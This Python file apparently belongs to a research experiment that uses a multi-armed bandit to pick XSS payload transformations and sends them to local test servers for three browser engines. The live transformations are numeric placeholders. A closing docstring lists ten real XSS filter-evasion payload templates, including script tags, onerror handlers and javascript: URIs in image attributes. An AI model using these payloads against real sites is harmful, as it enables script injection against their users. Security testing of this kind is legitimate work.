import requests
import random
from bfts.bandit import Bandit

random.seed(1)

def n_arms():
    return len(XSS_transformations())

def XSS_transformations():
    return create_XSS_transformations(20) # fill this list with functions that take one argument (a payload) and transform it in a certain way

def XSS_bandit():
    base_payload = "alert('Hi!')"
    transformations_ = XSS_transformations()
    transformed_payloads = list(transformation(base_payload) for transformation in transformations_)
    def reward_fn(payload_):
        return lambda: send_and_get_result(payload_)
    arms = list(map(reward_fn, transformed_payloads))
    return Bandit(arms)
    
def send_and_get_result(payload_):
    engine_to_ip_dict = {"chromium": "127.0.0.1:8000", "safari": "127.0.0.1:8001", "firefox": "127.0.0.1:8002"}

    # 1st choose which server to send it to (which browser engine)
    engines = ["chromium", "safari", "firefox"]
    engine = random.choice(engines)
    ip = engine_to_ip_dict[engine]

    # 2nd send the payload to that server
    full_ip = ip + "/search/?q=" + payload_
    r = requests.get(full_ip)

    # 3rd receive a HTTP response of that server (this will be either 200 (success) or 404 (fail))
    status = r.status_code

    # 4th return this response
    if status == 200:
        return 1
    else:
        return 0


# Simulations of XSS transformations:

# Creates a technique that returns the same identifier that it has in its name
def create_technique(number):

    def transformation(base_payload: str):
        return number
    
    transformation.__name__="transformation_" + str(number)

    return transformation

# Creates a list of functions that have incremented identifiers
def create_XSS_transformations(amount: int):
    all_techniques = []

    for i in range(1, amount+1):
        technique = create_technique(i)
        all_techniques.append(technique)

    return all_techniques


# manually defined transformations: 

# def transformation_1(base_payload: str):
#     return 1

# def transformation_2(base_payload: str):
#     return 2

# def transformation_3(base_payload: str):
#     return 3

# def transformation_4(base_payload: str):
#     return 4

# def transformation_5(base_payload: str):
#     return 5

# def transformation_6(base_payload: str):
#     return 6

# def transformation_7(base_payload: str):
#     return 7

# def transformation_8(base_payload: str):
#     return 8

# def transformation_9(base_payload: str):
#     return 9

# def transformation_10(base_payload: str):
#     return 10

# def transformation_11(base_payload: str):
#     return 11

# def transformation_12(base_payload: str):
#     return 12

# def transformation_13(base_payload: str):
#     return 13

# def transformation_14(base_payload: str):
#     return 14

# def transformation_15(base_payload: str):
#     return 15

# def transformation_16(base_payload: str):
#     return 16

# def transformation_17(base_payload: str):
#     return 17

# def transformation_18(base_payload: str):
#     return 18

# def transformation_19(base_payload: str):
#     return 19

# def transformation_20(base_payload: str):
#     return 20


'''
Properly implemented XSS payload transformations

def script_tags(base_payload: str):
    return "<script>" + base_payload + "</script>"

def non_alpha_non_digit(base_payload: str):
    return "<script\XSS>" + base_payload + "</script>"

def malformed_IMG_tags(base_payload: str):
    return "<IMG \"\"\"><script>" + base_payload + "</script>\"\\>"

def on_error_alert(base_payload: str):
    return "<IMG SRC=/ onerror=\"" + base_payload + "\"></img>" # can also change the text inside the alert to String.fromCharCode(num, num, num) if you want to completely remove quotes from the payload

def extraneous_open_brackets(base_payload: str):
    return "<script>" + base_payload + ";//\<</script>"

def end_title_tag(base_payload: str):
    return "</TITLE><script>" + base_payload + ";</script>"

def input_image(base_payload: str):
    return "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:" + base_payload + ";\">"

def body_image(base_payload: str):
    return "<BODY BACKGROUND=\"javascript:" + base_payload + "\">"

def IMG_Dynsrc(base_payload: str):
    return "<IMG DYNSRC=\"javascript:" + base_payload + "\">"

def IMG_Lowsrc(base_payload: str):
    return "<IMG LOWSRC=\"javascript:" + base_payload + "\">"

'''